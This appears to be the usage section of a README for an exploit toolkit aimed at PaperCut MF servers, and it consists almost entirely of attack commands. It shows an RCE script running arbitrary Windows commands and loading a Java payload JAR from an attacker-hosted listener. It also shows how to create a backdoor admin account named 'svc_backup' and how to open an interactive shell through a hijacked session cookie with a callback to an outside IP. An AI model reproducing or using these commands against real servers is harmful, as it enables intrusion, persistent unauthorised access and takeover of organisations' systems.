# pcut2026

### Windows command target
python3 papercut_external_lookup_rce.py 10.0.0.5 \
  --win-command 'whoami > C:\proof.txt'

### Java payload JAR (served over HTTP, loaded by the target)
python3 papercut_external_lookup_rce.py 192.168.1.10 \
  --jar payload.jar --lhost 192.168.1.100 --lport 8080

### Read-only version check only
python3 papercut_external_lookup_rce.py 192.168.1.10 --check -v

### HTTPS target with a self-signed cert (verification disabled by default)
python3 papercut_external_lookup_rce.py papercut.corp.local --ssl \
  --win-command 'whoami > C:\proof.txt'

# Create the internal user
python3 papercut_external_lookup_rce.py 10.0.0.5 \
  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-new-internal-user svc_backup S3cretPass"'

# Grant admin rights
python3 papercut_external_lookup_rce.py 10.0.0.5 \
  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-admin-access-user svc_backup"'


# Easiest path: log into the admin UI in a browser, grab JSESSIONID, reuse it
python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID

# Or let the tool start the listener and run one command
python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
    -c "whoami"

# Interactive, with an explicit callback IP/port (must be reachable FROM the target)
python3 papercut_shell.py -u https://papercut.example.com --cookie YOUR_JSESSIONID \
    --callback http://10.0.40.83:8081
